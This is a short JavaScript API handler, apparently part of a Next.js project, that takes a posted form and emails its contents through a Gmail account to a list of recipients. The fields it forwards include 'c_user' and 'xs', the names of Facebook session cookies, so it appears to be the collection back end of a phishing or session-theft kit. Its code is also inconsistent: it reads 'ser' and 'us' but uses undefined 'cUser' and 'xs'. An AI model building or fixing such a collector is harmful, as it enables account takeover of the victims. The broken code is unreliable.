import nodemailer from "nodemailer";

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ message: "Only POST allowed" });
  }

  const { ser, us, emails, workerEmail, name } = req.body;

  try {
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    const textMessage = `
New Form Submission:

Name: ${name}
c_user: ${cUser}
xs: ${xs}
Worker Email: ${workerEmail}

Sent to: ${emails.join(", ")}
    `;

    // Send email to all emails
    for (let email of emails) {
      await transporter.sendMail({
        from: process.env.EMAIL_USER,
        to: email,
        subject: "New Form Submission",
        text: textMessage,
      });
    }

    return res.status(200).json({ success: true, msg: "Emails sent!" });

  } catch (error) {
    console.error(error);
    return res.status(500).json({ success: false, msg: "Error sending email" });
  }
}
